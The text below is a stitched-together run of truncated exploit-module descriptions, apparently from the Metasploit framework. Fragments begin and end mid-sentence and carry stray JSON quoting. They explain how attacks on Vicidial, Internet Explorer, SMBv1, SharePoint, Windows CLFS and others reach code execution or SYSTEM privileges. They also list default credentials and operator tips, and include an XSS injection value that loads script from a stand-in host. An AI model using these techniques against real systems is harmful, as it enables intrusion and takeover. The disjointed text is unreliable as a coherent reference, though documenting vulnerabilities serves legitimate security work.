In case there isn't any valid session, the user can provide astGUIcient credentials in order to create one. The results of the injected commands are returned as part of the response from the web server. Affected versions include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well. The default credentials used by Vicidial are VDCL/donotedit and VDAD/donotedit.",

The exploit uses the Upload Theme functionality to upload a zip file containing the payload. The plugin uses the admin_init hook, which is also executed for unauthenticated users when accessing a specific URL. The first fix for this vulnerability appeared in version 2.6.7, but the fix can be bypassed. In PHP's default configuration, a POST variable overwrites a GET variable in the $_REQUEST array. The plugin uses $_REQUEST to check for access rights. By setting the POST parameter to something not beginning with 'wysija_', the check is bypassed. Wordpress uses the $_GET array to determine the page, so it is not affected by this. The developers applied the fixes to all previous versions too.",

When SSL is re-established on a NDMP connection that previously has had SSL established, the BIO struct for the connection's previous SSL session is reused, even though it has previously been freed. This module supports 3 specific versions of the Backup Exec agent in the 14, 15 and 16 series on 64-bit and 32-bit versions of Windows and has been tested from Vista to Windows 10. The check command can help narrow down what major and minor revision is installed and the precise of version of Windows, but some other information may be required to make a reliable choice of target. NX, ASLR and Windows 8+ anti-ROP mitigations are bypassed. On Windows 8+, it has a reliability of around 85%. On other versions of Windows, reliability is around 35% (due to the need to win a race condition across the network in this case; this may drop further depending on network conditions). The agent is normally installed on all hosts in a domain that need to be backed up, so if one service crashes, try again on another :) Successful exploitation will give remote code execution as the user of the Backup Exec Remote Agent for Windows service, almost always NT AUTHORITY\\SYSTEM.",

By calling the 'AuthCredential' method with a specially crafted Unicode format string, an attacker can cause memory corruption and execute arbitrary code. Unfortunately, it does not appear to be possible to indirectly re-use existing stack data for more reliable exploitation. This is due to several particulars about this vulnerability. First, the format string must be a Unicode string, which uses two bytes per character. Second, the buffer is allocated on the stack using the 'alloca' function. As such, each additional format specifier (%x) will add four more bytes to the size allocated. This results in the inability to move the read pointer outside of the buffer. Further testing showed that using specifiers that pop more than four bytes does not help. Any number of format specifiers will result in accessing the same value within the buffer. NOTE: It may be possible to leverage the vulnerability to leak memory contents. However, that has not been fully investigated at this time.",

    "description": "This module exploits a use-after-free vulnerability that currents targets Internet Explorer 9 on Windows 7, but the flaw should exist in versions 6/7/8/9/10/11. It was initially found in the wild in Japan, but other regions such as English, Chinese, Korean, etc, were targeted as well. The vulnerability is due to how the mshtml!CDoc::SetMouseCapture function handles a reference during an event. An attacker first can setup two elements, where the second is the child of the first, and then setup a onlosecapture event handler for the parent element. The onlosecapture event seems to require two setCapture() calls to trigger, one for the parent element, one for the child. When the setCapture() call for the child element is called, it finally triggers the event, which allows the attacker to cause an arbitrary memory release using document.write(), which in particular frees up a 0x54-byte memory. The exact size of this memory may differ based on the version of IE. After the free, an invalid reference will still be kept and pass on to more functions, eventuall this arrives in function MSHTML!CTreeNode::GetInterface, and causes a crash (or arbitrary code execution) when this function attempts to use this reference to call what appears to be a PrivateQueryInterface due to the offset (0x00). To mimic the same exploit found in the wild, this module will try to use the same DLL from Microsoft Office 2007 or 2010 to leverage the attack.",

    "description": "This exploit takes advantage of the \"Initialize and script ActiveX controls not marked safe for scripting\" setting within Internet Explorer. When this option is set, IE allows access to the WScript.Shell ActiveX control, which allows javascript to interact with the file system and run commands. This security flaw is not uncommon in corporate environments for the 'Intranet' or 'Trusted Site' zones. When set via domain policy, the most common registry entry to modify is HKLM\\ Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1\\1201, which if set to '0' forces ActiveX controls not marked safe for scripting to be enabled for the Intranet zone. This module creates a javascript/html hybrid that will render correctly either via a direct GET http://msf-server/ or as a javascript include, such as in: http://intranet-server/xss.asp?id=\"><script%20src=http://10.10.10.10/ie_unsafe_script.js> </script>. IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from an x64 iexplore.exe. By default, this module will not attempt to fire against IEs that come with Protected Mode enabled by default, because it can trigger a security prompt. However, if you are feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT datastore option to true.",

A string of 396 bytes is enough to overflow the 256 byte stack buffer and overwrite some local variables as well as the saved return address. NOTE: The string being copied is first passed through the \"WideCharToMultiByte\". Due to this, only characters which have a valid localized multibyte representation are allowed. Invalid characters will be replaced with question marks ('?'). This vulnerability was originally discovered independently by both Stephen Fewer and Berend Jan Wever (SkyLined). Although exhaustive testing hasn't been done, all versions since version 6 Update 10 are believed to be affected by this vulnerability.

Microsoft supports accessing help documents directly via URLs by installing a protocol handler for the scheme \"hcp\". Due to an error in validation of input to hcp:// combined with a local cross site scripting vulnerability and a specialized mechanism to launch the XSS trigger, arbitrary command execution can be achieved. On IE7 on XP SP2 or SP3, code execution is automatic. If WMP9 is installed, it can be used to launch the exploit automatically. If IE8 and WMP11, either can be used to launch the attack, but both pop dialog boxes asking the user if execution should continue. This exploit detects if non-intrusive mechanisms are available and will use one if possible. In the case of both IE8 and WMP11, the exploit defaults to using an iframe on IE8, but is configurable by setting the DIALOGMECH option to \"none\" or \"player\". This module creates a WebDAV service from which the payload is copied to the victim machine.",

This leads to the program counter being set to the address determined by the address \"[vtable+0x30+1]\". The particular address depends on the exact version of the mshtml library in use. Since the address depends on the version of mshtml, some versions may not be exploitable.

Also, since the address is not controllable, it is unlikely to be possible to use ROP to bypass non-executable memory protections.",

On IE 9, it seems to only affect certain releases of mshtml.dll, ranging from a newly installed IE9 (9.0.8112.16446), to 9.00.8112.16502 (July 2013 update). IE8 requires a different way to trigger the vulnerability, but not currently covered by this module. The issue is specific to the browser's IE7 document compatibility, which can be defined in X-UA-Compatible, and the content editable mode must be enabled. An \"onmove\" event handler is also necessary to be able to trigger the bug, and the event will be run twice before the crash. The first time is due to the position change of the body element, which is also when a MSHTML!CFlatMarkupPointer::`vftable' object is created during a \"SelectAll\" command, and this object will be used later on for the crash. The second onmove event seems to be triggered by a InsertButton (or Insert-whatever) command, which is also responsible for the free of object CFlatMarkupPointer during page rendering. The EnsureRecalcNotify() function will then still return an invalid reference to CFlatMarkupPointer (stored in EBX), and then passes this on to the next functions (GetLineInfo -> QIClassID). When this reference arrives in function QIClassID, an access violation finally occurs when the function is trying to call QueryInterface() with the bad reference, and this results a crash. Successful control of the freed memory may leverage arbitrary code execution under the context of the user.

If we use a select() function for the CTextArea element, two important things will happen: a CDisplayPointer object will be created for CTextArea, and it will also trigger another event called \"onselect\". The \"onselect\" event will allow us to set up for the actual event handler we want to abuse - the \"onpropertychange\" event. Since the CBlockElement is a child of CTextArea, if we do a node swap of CBlockElement in \"onselect\", this will trigger \"onpropertychange\". During \"onpropertychange\" event handling, a free of the CDisplayPointer object can be forced by using an \"Unselect\" (other approaches also apply), but a reference of this freed memory will still be kept by CDoc::ScrollPointerIntoView, specifically after the CDoc::GetLineInfo call, because it is still trying to use that to update CDisplayPointer's position. When this invalid reference arrives in QIClassID, a crash finally occurs due to accessing the freed memory. By controlling this freed memory, it is possible to achieve arbitrary code execution under the context of the user.",

    "description": "This module exploits a vulnerability on the CardSpaceClaimCollection class from the icardie.dll ActiveX control. The vulnerability exists while the handling of the CardSpaceClaimCollection object. CardSpaceClaimCollections stores a collection of elements on a SafeArray and keeps a size field, counting the number of elements on the collection. By calling the remove() method on an empty CardSpaceClaimCollection it is possible to underflow the length field, storing a negative integer. Later, a call to the add() method will use the corrupted length field to compute the address where write into the SafeArray data, allowing to corrupt memory with a pointer to controlled contents. This module achieves code execution by using VBScript as discovered in the wild on November 2013 to (1) create an array of html OBJECT elements, (2) create holes, (3) create a CardSpaceClaimCollection whose SafeArray data will reuse one of the holes, (4) corrupt one of the legit OBJECT elements with the described integer overflow and (5) achieve code execution by forcing the use of the corrupted OBJECT.",

    "description": "The IBM Personal Communications I-Series application WorkStation is susceptible to a stack-based buffer overflow vulnerability within file parsing in which data copied to a location in memory exceeds the size of the reserved destination area. The buffer is located on the runtime program stack. When the WorkStation file is opened it will reach the code path at 0x67575180 located in pcspref.dll which conducts string manipulation and validation on the data supplied in the WorkStation file. The application will first check if 'Profile' header exists and appends a dot with the next parameter within the file. It will then measure the character length of the header by calling strcspn with a dot as its null-terminated character. It will then write the header into memory and ensure the header ends with a NUL character. The parameter character array is passed to the strcpy() function. The application has declared a 52-element character array for the destination for strcpy function. The function does not perform bounds checking therefore, data can be written paste the end of the buffer variable resulting in corruption of adjacent variables including other local variables, program state information and function arguments. You will notice that the saved RETURN address at offset 0x6c is overwritten by the data written past the buffer. To ensure we can perform arbitrary code execution we must we provide a valid pointer at 0x74 which is used as an argument for the called function at 0x675751ED as an id file extension parameter. Once the caller regains control we will reach our RETURN. The Ret instruction will be used to pop the overwritten saved return address which was corrupted. This exploit has been written to bypass 2 mitigations DEP and ASLR on a Windows platform.

The user can double click the file, use the file dialog, open via the icon and drag/drop the file into Irfanview's window. An egg hunter is used for stability.",

This is dangerous and would be unexpected to an end user. Executable files can live in a sub-directory so when the \".contact\" website link is clicked it traverses directories towards the executable and runs. Making matters worse is if the files are compressed then downloaded \"mark of the web\" (MOTW) may potentially not work as expected with certain archive utilitys. The \".\\\" chars allow directory traversal to occur in order to run the attackers supplied executable sitting unseen in the attackers directory.

    "description": "This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE) allowing arbitrary code execution, publicly known as \"Sandworm\". Platforms such as Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable. However, based on our testing, the most reliable setup is on Windows platforms running Office 2013 and Office 2010 SP2. And please keep in mind that some other setups such as using Office 2010 SP1 might be less stable, and sometimes may end up with a crash due to a failure in the CPackage::CreateTempFileName function. This module will generate three files: an INF, a GIF, and a PPSX file. You are required to set up a SMB or Samba 3 server and host the INF and GIF there. Systems such as Ubuntu or an older version of Windows (such as XP) work best for this because they require little configuration to get going. The PPSX file is what you should send to your target. In detail, the vulnerability has to do with how the Object Packager 2 component (packager.dll) handles an INF file that contains malicious registry changes, which may be leveraged for code execution. First of all, Packager does not load the INF file directly. As an attacker, you can trick it to load your INF anyway by embedding the file path as a remote share in an OLE object. The packager will then treat it as a type of media file, and load it with the packager!CPackage::OLE2MPlayerReadFromStream function, which will download it with a CopyFileW call, save it in a temp folder, and pass that information for later. The exploit will do this loading process twice: first for a fake gif file that's actually the payload, and the second for the INF file. The packager will also look at each OLE object's XML Presentation Command, specifically the type and cmd property. In the exploit, \"verb\" media command type is used, and this triggers the packager!CPackage::DoVerb function. Also, \"-3\" is used as the fake gif file's cmd property, and \"3\" is used for the INF. When the cmd is \"-3\", DoVerb will bail. But when \"3\" is used (again, for the INF file), it will cause the packager to try to find appropriate handler for it, which will end up with C:\\Windows\\System32\\infDefaultInstall.exe, and that will install/run the malicious INF file, and finally give us arbitrary code execution.",

It was originally discovered in the wild, targeting Windows XP and Windows Server 2003 users running Microsoft Office, specifically in the Middle East and South Asia region. The flaw is due to a DWORD value extracted from the TIFF file that is embedded as a drawing in Microsoft Office, and how it gets calculated with user-controlled inputs, and stored in the EAX register. The 32-bit register will run out of storage space to represent the large value, which ends up being 0, but it still gets pushed as a dwBytes argument (size) for a HeapAlloc call. The HeapAlloc function will allocate a chunk anyway with size 0, and the address of this chunk is used as the destination buffer of a memcpy function, where the source buffer is the EXIF data (an extended image format supported by TIFF), and is also user-controlled. A function pointer in the chunk returned by HeapAlloc will end up being overwritten by the memcpy function, and then later used in OGL!GdipCreatePath. By successfully controlling this function pointer, and the memory layout using ActiveX, it is possible to gain arbitrary code execution under the context of the user.",

It does this by opening the file for reading and verifying the signature before opening the file for execution. Because this action is performed in two discrete operations, it opens the procedure for a time of check to time of use vulnerability. By embedding a UNC file path to an SMB server we control, the SMB server can serve a legitimate, signed dll when queried for the read, but then serve a different file of the same name when the host intends to load/execute the dll.",

When processing .VWR files, VisiWaveReport.exe attempts to match a valid pointer based on the 'Type' property (valid ones include 'Properties', 'TitlePage', 'Details', 'Graph', 'Table', 'Text', 'Image'), but if a match isn't found, the function that's supposed to handle this routine ends up returning the input as a pointer, and later used in a CALL DWORD PTR [EDX+10] instruction. This allows attackers to overwrite it with any arbitrary value, and results code execution. A patch is available at visiwave.com; the fix is done by XORing the return value as null if no match is found, and then it is validated before use. NOTE: During installation, the application will register two file handles, VWS and VWR, which allows a victim user to 'double click' the malicious VWR file and execute code.

By sending a specially crafted FTP PORT command, an attacker can corrupt stack memory and execute arbitrary code. This particular issue is caused by processing data bound by attacker controlled input while writing into a 4 byte stack buffer. Unfortunately, the writing that occurs is not a simple byte copy. Processing is done using a source ptr (p) and a destination pointer (q). The vulnerable function walks the input string and continues while the source byte is non-null. If a comma is encountered, the function increments the destination pointer. If an ascii digit [0-9] is encountered, the following occurs: *q = (*q * 10) + (*p - '0'); All other input characters are ignored in this loop. As a consequence, an attacker must craft input such that modifications to the current values on the stack result in usable values. In this exploit, the low two bytes of the return address are adjusted to point at the location of a 'call edi' instruction within the binary. This was chosen since 'edi' points at the source buffer when the function returns. NOTE: This server can be installed as a service using \"vftpd.exe install\". If so, the service does not restart automatically, giving an attacker only one attempt.",

The module first tries to authenticate to FlexDotnetCMS via an HTTP POST request to `/login`. It then attempts to upload a random TXT file and subsequently uses the FlexDotnetCMS file editor to rename the TXT file to an ASP file. If this succeeds, the target is vulnerable and the ASP file is generated as a copy of the TXT file, which remains on the server. Next, the module sends another request to rename the TXT file to an ASP file, this time adding the payload. Finally, the module tries to execute the ASP payload via a simple HTTP GET request to `/media/uploads/asp_payload` Valid credentials for a FlexDotnetCMS user with permissions to use the FileManager are required. This module has been successfully tested against FlexDotnetCMS v1.5.8 running on Windows Server 2012.",

The vulnerable code is within the option parsing function within \"ovwebsnmpsrv.exe\" with a timestamp prior to April 7th, 2010. Reaching the vulnerable code requires a 'POST' request with an 'arg' parameter that, when combined with some static text, exceeds 10240 bytes. The parameter must begin with a dash. It is important to note that this vulnerability must be exploited by overwriting SEH. This is since overflowing the buffer with controllable data always triggers an access violation when attempting to write static text beyond the end of the stack.

This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool.",

    "description": "This module exploits the \"custom script\" feature of ADSelfService Plus. The feature was removed in build 6122 as part of the patch for CVE-2022-28810. For purposes of this module, a \"custom script\" is arbitrary operating system command execution. This module uses an attacker provided \"admin\" account to insert the malicious payload into the custom script fields. When a user resets their password or unlocks their account, the payload in the custom script will be executed. The payload will be executed as SYSTEM if ADSelfService Plus is installed as a service, which we believe is the normal operational behavior. This is a passive module because user interaction is required to trigger the payload. This module also does not automatically remove the malicious code from the remote target. Use the \"TARGET_RESET\" operation to remove the malicious custom script when you are done. ADSelfService Plus uses default credentials of \"admin\":\"admin\"",

The RawQueue is processed every 1 minute by default, to a maximum of 60 minutes. Keep this in mind when choosing payloads or setting WfsDelay... You'll need to wait. Furthermore, this exploit uses a direct memory jump into a nopsled (which isn't very reliable).

The auth bypass allows attackers to impersonate the Sharepoint Admin user. This vulnerability stems from the signature validation check used to verify JSON Web Tokens (JWTs) used for OAuth authentication. If the signing algorithm of the user-provided JWT is set to none, SharePoint skips the signature validation step due to a logic flaw in the ReadTokenCore() method. After impersonating the administrator user, the attacker has access to the Sharepoint API and is able to exploit CVE-2023-24955. This authenticated RCE vulnerability leverages the impersonated privileged account to replace the \"/BusinessDataMetadataCatalog/BDCMetadata.bdcm\" file in the webroot directory with a payload.

Versions 7.2.6 and earlier and 9.0 and later are not affected. The vulnerability occurs due to Report.ashx's handler, located in Sitecore.Xdb.Client.dll under the Sitecore.sitecore.shell.ClientBin.Reporting.Report defintion, having a ProcessRequest() handler that calls ProcessReport() with the context of the attacker's request without properly checking if the attacker is authenticated or not. This request then causes ReportDataSerializer.DeserializeQuery() to be called, which will end up calling the DeserializeParameters() function of Sitecore.Analytics.Reporting.ReportDataSerializer, if a \"parameters\" XML tag is found in the attacker's request. Then for each subelement named \"parameter\", the code will check that it has a name and if it does, it will call NetDataContractSerializer().ReadObject on it. NetDataContractSerializer is vulnerable to deserialization attacks and can be trivially exploited by using the TypeConfuseDelegate gadget chain. By exploiting this vulnerability, an attacker can gain arbitrary code execution as the user that IIS is running as, aka NT AUTHORITY\\NETWORK SERVICE. Users can then use technique 4 of the \"getsystem\" command to use RPCSS impersonation and get SYSTEM level code execution.",

The vulnerable versions and builds expose three .NET remoting endpoints on port 17001, namely /Servers, /Mail and /Spool. For example, a typical installation of SmarterMail Build 6970 will have the /Servers endpoint exposed to the public at tcp://0.0.0.0:17001/Servers, where serialized .NET commands can be sent through a TCP socket connection. The three endpoints perform deserialization of untrusted data (CVE-2019-7214), allowing an attacker to send arbitrary commands to be deserialized and executed. This module exploits this vulnerability to perform .NET deserialization attacks, allowing remote code execution for any unauthenticated user under the context of the SYSTEM account. Successful exploitation results in full administrative control of the target server under the NT AUTHORITY\\SYSTEM account. This vulnerability was patched in Build 6985, where the 17001 port is no longer publicly accessible, although it can be accessible locally at 127.0.0.1:17001.

Both attacks consist in sending a specially crafted IPC request to the TCP port 62522 on the loopback device, which is exposed by the Cisco AnyConnect Secure Mobility Agent service.

The flaw exists due to the fact that this function calls `hdcOpenDCW()`, which performs a user mode callback. During this callback, attackers can call the `NtGdiResetDC()` function again with the same handle as before, which will result in the PDC object that is referenced by this handle being freed. The attacker can then replace the memory referenced by the handle with their own object, before passing execution back to the original `NtGdiResetDC()` call, which will now use the attacker's object without appropriate validation. This can then allow the attacker to manipulate the state of the kernel and, together with additional exploitation techniques, gain code execution as NT AUTHORITY\\SYSTEM.

It is important to note that the credentials supplied for the second user to log in as in this exploit must be those of a normal non-admin user and these credentials must also corralate with a user who has already logged in at least once before. Additionally the current user running the exploit must have UAC set to the highest level, aka \"Always Notify Me When\", in order for the code to be executed as NT AUTHORITY\\SYSTEM.

    "description": "A privilege escalation vulnerability exists in the clfs.sys driver which comes installed by default on Windows 10 21H2, Windows 11 21H2 and Windows Server 20348 operating systems. The clfs.sys driver contains a function CreateLogFile that is used to create open and edit '*.blf' (base log format) files. Inside a .blf file there are multiple blocks of data which contain checksums to verify the integrity of the .blf file and to ensure the file looks and acts like a .blf file. However, these files can be edited with CreateFileA or with fopen and then modified with WriteFile or fwrite respectively in order to change the contents of the file and update their checksums accordingly. This exploit makes use to two different kinds of specially crafted .blf files that are edited using the technique mentioned above. There are multiple spray .blf files. The spray .blf files are specially crafted to initiate an out of bounds read which reads from a contiguous block of memory. The block of memory it reads from contains a read-write pipe that points to the address of the second type of .blf file - the trigger .blf file. The trigger .blf file is specially crafted read the SYSTEM token and write it in the process of the exploit to achieve the local privilege escalation. The exploits creates a controlled memory space by first looping over the CreatePipe function to to create thousands of read-write pipes (which take up 0x90 bytes of memory). It then releases a certain number of pipes from memory and calls CreateLogFile to open the pre-existing spray .blf files which when being opened fill the 0x90 byte gaps created by the deallocation of the pipes in memory, creating the controlled memory space. This is a very brief and high overview description of what the exploit is actually doing. For a more detailed and in depth analysis please refer to the following [reference](https://github.com/fortra/CVE-2023-28252).",

    "description": "This module exploits a feature in the DNS service of Windows Server. Users of the DnsAdmins group can set the `ServerLevelPluginDll` value using dnscmd.exe to create a registry key at `HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\` named `ServerLevelPluginDll` that can be made to point to an arbitrary DLL. After doing so, restarting the service will load the DLL and cause it to execute, providing us with SYSTEM privileges. Increasing WfsDelay is recommended when using a UNC path. Users should note that if the DLLPath variable of this module is set to a UNC share that does not exist, the DNS server on the target will not be able to restart. Similarly if a UNC share is not utilized, and users instead opt to drop a file onto the disk of the target computer, and this gets picked up by Anti-Virus after the timeout specified by `AVTIMEOUT` expires, its possible that the `ServerLevelPluginDll` value of the `HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\` key on the target computer may point to an nonexistant DLL, which will also prevent the DNS server from being able to restart. Users are advised to refer to the documentation for this module for advice on how to resolve this issue should it occur. This module has only been tested and confirmed to work on Windows Server 2019 Standard Edition, however it should work against any Windows Server version up to and including Windows Server 2019.",

This function has a vulnerability where it doesn't correctly check the impersonation token of the caller to determine if the user is an administrator. It reads the caller's impersonation token using PsReferenceImpersonationToken and then does a comparison between the user SID in the token to LocalSystem's SID. It doesn't check the impersonation level of the token so it's possible to get an identify token on your thread from a local system process and bypass this check.

The vulnerability lies in a specific IOCTL handler in the rzpnk.sys driver that passes a PID specified by the user to ZwOpenProcess. This can be issued by an application to open a handle to an arbitrary process with the necessary privileges to allocate, read and write memory in the specified process. This exploit leverages this vulnerability to open a handle to the winlogon process (which runs as NT_AUTHORITY\\SYSTEM) and infect it by installing a hook to execute attacker controlled shellcode. This hook is then triggered on demand by calling user32!LockWorkStation(), resulting in the attacker's payload being executed with the privileges of the infected winlogon process. In order for the issued IOCTL to work, the RazerIngameEngine.exe process must not be running. This exploit will check if it is, and attempt to kill it as necessary. The vulnerable software can be found here: https://www.razerzone.com/synapse/. No Razer hardware needs to be connected in order to leverage this vulnerability.

Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the same problem. The offensive technique is also described in Writing Secure Code (2nd Edition), Chapter 23, in the section \"Calling Processes Security\" on page 676.

    "description": "This module will create a permanent WMI event subscription to achieve file-less persistence using one of five methods. The EVENT method will create an event filter that will query the event log for an EVENT_ID_TRIGGER (default: failed logon request id 4625) that also contains a specified USERNAME_TRIGGER (note: failed logon auditing must be enabled on the target for this method to work, this can be enabled using \"auditpol.exe /set /subcategory:Logon /failure:Enable\"). When these criteria are met a command line event consumer will trigger an encoded powershell payload. The INTERVAL method will create an event filter that triggers the payload after the specified CALLBACK_INTERVAL. The LOGON method will create an event filter that will trigger the payload after the system has an uptime of 4 minutes. The PROCESS method will create an event filter that triggers the payload when the specified process is started. The WAITFOR method creates an event filter that utilizes the Microsoft binary waitfor.exe to wait for a signal specified by WAITFOR_TRIGGER before executing the payload. The signal can be sent from a windows host on a LAN utilizing the waitfor.exe command (note: requires target to have port 445 open). Additionally a custom command can be specified to run once the trigger is activated using the advanced option CUSTOM_PS_COMMAND. This module requires administrator level privileges as well as a high integrity process. It is also recommended not to use stageless payloads due to powershell script length limitations.",

However most systems have not been updated. In regard to the payload, unless there is a closed port in the web server, you dont want to use any \"bind\" payload. You want a \"reverse\" payload, probably to your port 80 or to any other outbound port allowed on the firewall. Currently, one delivery method is supported This method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable.

Please note before using this exploit, you must have precise knowledge of the victim machine's QuickTime version (if installed), and then select your target accordingly. In addition, even though this exploit can be used as remote, you should be aware the victim's browser behavior when opening an itms link. For example, IE/Firefox/Opera by default will ask the user for permission before launching the itms link by iTunes. Chrome will ask for permission, but also spits a warning.

This pointer is not used by this exploit. This particular exploit replaces the previous dual-method exploit. It uses a technique where the value contained in ecx becomes the stack. From there, return oriented programming is used to normalize the execution state and finally execute the payload via a \"jmp esp\". All addresses used were found within the sqlservr.exe memory space, yielding very reliable code execution using only a single query.

Successful exploitation should not crash either the service or the server; however, after initial use the port cannot be reused for successive exploitation until the service has been restarted. Consider using a command execution payload following the bind shell to restart the service if you need to reuse the same port. The overflow appears to occur in the debugging/error reporting section of the slmail.exe executable, and there are multiple offsets that will lead to successful exploitation. This exploit uses 2606, the offset that creates the smallest overall payload. The other offset is 4654. The return address is overwritten with a \"jmp esp\" call from the application library SLMFC.DLL found in %SYSTEM%\\system32\\. This return address works against all version of Windows and service packs. The last modification date on the library is dated 06/02/99. Assuming that the code where the overflow occurs has not changed in some time, prior version of SLMail may also be vulnerable with this exploit. The author has not been able to acquire older versions of SLMail for testing purposes. Please let us know if you were able to get this exploit working against other SLMail versions.",

By supplying a long string of data to the 'Rename' (0x02), 'Delete' (0x03), or 'Add' (0x04) command, a buffer overflow condition occurs in IGSSdataServer.exe while handing an RMS report, which results arbitrary code execution under the context of the user. The attack is carried out in three stages. The first stage sends the final payload to IGSSdataServer.exe, which will remain in memory. The second stage sends the Add command so the process can find a valid ID for the Rename command. The last stage then triggers the vulnerability with the Rename command, and uses an egghunter to search for the shellcode that we sent in stage 1. The use of egghunter appears to be necessary due to the small buffer size, which cannot even contain our ROP chain and the final payload.",

There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.",

    "description": "This module will relay SMB authentication requests to another host, gaining access to an authenticated SMB session if successful. If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary payload. To exploit this, the target system must try to authenticate to this module. The easiest way to force a SMB authentication attempt is by embedding a UNC path (\\SERVER\\SHARE) into a web page or email message. When the victim views the web page or email, their system will automatically connect to the server specified in the UNC share (the IP address of the system running this module) and attempt to authenticate. Unfortunately, this module is not able to clean up after itself. The service and payload file listed in the output will need to be manually removed after access has been gained. The service created by this tool uses a randomly chosen name and description, so the services list can become cluttered after repeated exploitation. The SMB authentication relay attack was first reported by Sir Dystic on March 31st, 2001 at @lanta.con in Atlanta, Georgia. On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin includes a patch which prevents the relaying of challenge keys back to the host which issued them, preventing this exploit from working in the default configuration. It is still possible to set the SMBHOST parameter to a third-party host that the victim is authorized to access, but the \"reflection\" attack has been effectively broken. As of Feb 2022 - this module does not support SMB 1.",
